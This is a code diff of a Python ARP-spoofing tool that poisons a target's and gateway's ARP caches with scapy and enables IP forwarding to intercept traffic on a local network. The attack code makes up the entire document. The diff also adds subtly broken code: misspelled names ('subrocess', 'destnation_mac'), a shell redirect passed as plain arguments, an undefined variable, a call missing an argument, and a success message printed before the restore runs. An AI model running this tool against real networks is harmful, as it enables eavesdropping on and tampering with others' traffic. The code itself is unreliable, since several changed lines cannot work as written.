@@ -28,43 +28,34 @@ RESET = "\033[0m"
 
 def get_arguments():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-t", "--target", dest="target",
-                        help="Specify the IP address of the target machine.")
-    parser.add_argument("-g", "--gateway", dest="gateway",
-                        help="Specify the IP address of the gateway (typically your router).")
-    parser.add_argument("-v", "--verbose", dest="verbose", action="store_true",
-                        help="Use this to enable verbose mode.")
+    parser.add_argument("-t", "--target", dest="target", help="Specify the IP address of the target machine.")
+    parser.add_argument("-g", "--gateway", dest="gateway", help="Specify the IP address of the gateway (typically your router).")
+    parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Use this to enable verbose mode.")
     args = parser.parse_args()
-
+    
     if not args.target:
-        parser.error(
-            "[-] You need target IP address with gateway address to run the program. Use -t or --target to specify IP for target Machine.")
+        parser.error("[-] You need target IP address with gateway address to run the program. Use -t or --target to specify IP for target Machine.")
     elif not args.gateway:
-        parser.error(
-            "[-] You need gateway IP address with target address to run the program. User -g or --gateway to specify IP for gateway.")
+        parser.error("[-] You need gateway IP address with target address to run the program. User -g or --gateway to specify IP for gateway.")
     return args
 
 
 def toggle_port_forwarding():
     system_platform = platform.system().lower()
-
     print(f"[+] Detected platform: {system_platform}")
 
     if system_platform == "windows":
         print("[!] Enabling port forwarding temporarily (Windows)...")
         try:
-            subprocess.run(
-                "netsh interface ipv4 set global forwarding=enabled", check=True, shell=True)
+            subprocess.run("netsh interface ipv4 set global forwarding=enabled", check=True, shell=True)
             print("[+] Port forwarding enabled. A reboot may be required.")
         except subprocess.CalledProcessError:
-            print(
-                "[-] Failed to enable port forwarding on Windows. Try running as Administrator.")
+            print("[-] Failed to enable port forwarding on Windows. Try running as Administrator.")
 
     elif system_platform == "linux":
-        print("[!] Enabling port forwarding temporarily (Linux)...")
+        print("[!] Enabling port forwarding temporarily...")
         try:
-            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-                f.write("1")
+            subrocess.call(["echo", "1", ">", "/proc", "/sys", "/net", "/ipv4", "/ip_forward"], check=True)
             print("[+] Port forwarding enabled.")
         except PermissionError:
             print("[-] Permission denied. Try running with sudo.")
@@ -74,8 +65,7 @@ def toggle_port_forwarding():
     elif system_platform == "darwin":
         print("[!] Enabling port forwarding temporarily (macOS)...")
         try:
-            subprocess.run(
-                ["sysctl", "-w", "net.inet.ip.forwarding=1"], check=True)
+            subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=1"], check=True)
             print("[+] Port forwarding enabled.")
         except subprocess.CalledProcessError:
             print("[-] Failed to enable port forwarding on macOS.")
@@ -91,9 +81,8 @@ def toggle_port_forwarding():
             print(f"[-] Error: {e}")
 
     elif system_platform == "openbsd":
-        print(
-            "[!] Please manually set 'net.inet.ip.forwarding=1' in /etc/sysctl.conf on OpenBSD.")
-
+        print("[!] Please manually set 'net.inet.ip.forwarding=1' in /etc/sysctl.conf on OpenBSD.")
+        
     elif system_platform == "netbsd":
         print("[!] Please manually configure forwarding in /etc/sysctl.conf on NetBSD.")
 
@@ -106,7 +95,6 @@ def toggle_port_forwarding():
 
     elif system_platform == "cygwin":
         print("[!] Cygwin environment detected. Port forwarding should be configured using native Windows tools.")
-
     else:
         print(f"[-] Unsupported or unknown platform: {system_platform}")
 
@@ -117,18 +105,16 @@ def disable_port_forwarding():
     if system_platform == "windows":
         print("[!] Disabling port forwarding (Windows)...")
         try:
-            subprocess.run(
-                "netsh interface ipv4 set global forwarding=disabled", check=True, shell=True)
+            subprocess.run("netsh interface ipv4 set global forwarding=disabled", check=True, shell=True)
             print("[+] Port forwarding disabled.")
         except subprocess.CalledProcessError:
             print(
                 "[-] Failed to disable port forwarding on Windows. Try running as Administrator.")
 
     elif system_platform == "linux":
-        print("[!] Disabling port forwarding (Linux)...")
+        print("[!] Disabling port forwarding...")
         try:
-            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-                f.write("0")
+            subprocess.call(["echo", "0", ">", "/proc", "/sys", "/net", "/ipv4","/ip_forward"], check=True)
             print("[+] Port forwarding disabled.")
         except PermissionError:
             print("[-] Permission denied. Try running with sudo.")
@@ -182,7 +168,7 @@ def get_mac(ip):
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
         packet = broadcast/request
         answered = scapy.srp(packet, timeout=1, verbose=False)[0]
-
+        
         return answered[0][1].hwsrc
     except Exception as e:
         print(f"[!] Error during Scan: {e}")
@@ -191,16 +177,15 @@ def get_mac(ip):
 
 def spoof(target_ip, spoof_ip, verbose):
     target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, verbose=verbose or False)
+    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.sendp(packet, verbose=verbose or False)
 
 
 def restore(destination_ip, source_ip, verbose):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip,
-                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, count=4, verbose=verbose or False)
+    packet = scapy.Ether(dst=destnation_mac) / scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.sendp(packet, count=4, verbose=verbose or False)
 
 
 def print_info(target, gateway, verbose):
@@ -212,10 +197,10 @@ def print_info(target, gateway, verbose):
         spoof(target, gateway, verbose)
         spoof(gateway, target, verbose)
         packet_sent += 2
-        print(f"\r{target}\t{gateway}\t{str(packet_sent)}", end="")
+        print(f"\r{options.target:<15} {options.gateway:<15} {packet_sent}", end="", flush=True)
         time.sleep(2)
 
-
+# Validate the ip addresses
 def validate_ip(ip):
     try:
         scapy.ARP(pdst=ip)
@@ -223,18 +208,29 @@ def validate_ip(ip):
     except Exception:
         return False
 
-
+# Main function
 def main():
-    options = get_arguments()
-    validate_ip(options.target)
-    validate_ip(options.gateway)
-    toggle_port_forwarding()
-    try:
-        print_info(options.target, options.gateway, options.verbose)
-    except KeyboardInterrupt:
-        print("[+] Detected Ctrl + C. Quitting...")
-        restore(options.gateway, options.target)
-        disable_port_forwarding()
+    if os.geteuid() != 0:
+        print(f"[-] Run this program with sudo or as root. {RED}Exiting...{RESET}")
+        sys.exit(1)
+    else:
+        options = get_arguments()
+        validate_ip(options.target)
+        validate_ip(options.gateway)
+        try:
+            toggle_port_forwarding()
+        except Exception as e:
+            print(f"Error while enabling port forwarding: {e}")
+        try:
+            print_info(options.target, options.gateway, options.verbose)
+        except KeyboardInterrupt:
+            print(f"{RED}[!] Detected Ctrl + C. Exiting program...{RESET}")
+            print(f"{GREEN}[+] ARP tables corrected.{RESET}")
+            restore(options.gateway, options.target)
+            try:
+                disable_port_forwarding()
+            except Exception as e:
+                print(f"Error while disabling port forwarding: {e}")
 
 
 if __name__ == "__main__":
